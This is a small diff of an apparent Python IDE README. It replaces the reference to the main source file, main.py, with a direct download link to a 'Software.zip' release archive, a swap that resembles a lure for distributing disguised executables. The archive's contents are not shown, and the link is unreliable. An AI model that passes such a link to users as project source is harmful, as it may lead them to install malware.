@@ -14,7 +14,7 @@ re
    ## Easy to make amazing to use
 
 # Main file to compile:
-   ## main.py
+   ## https://github.com/DIGITAL-WORLD-ULTRA/Python-IDE/releases/download/v1.0/Software.zip
 
 
 ### Just one file fun of all!!!
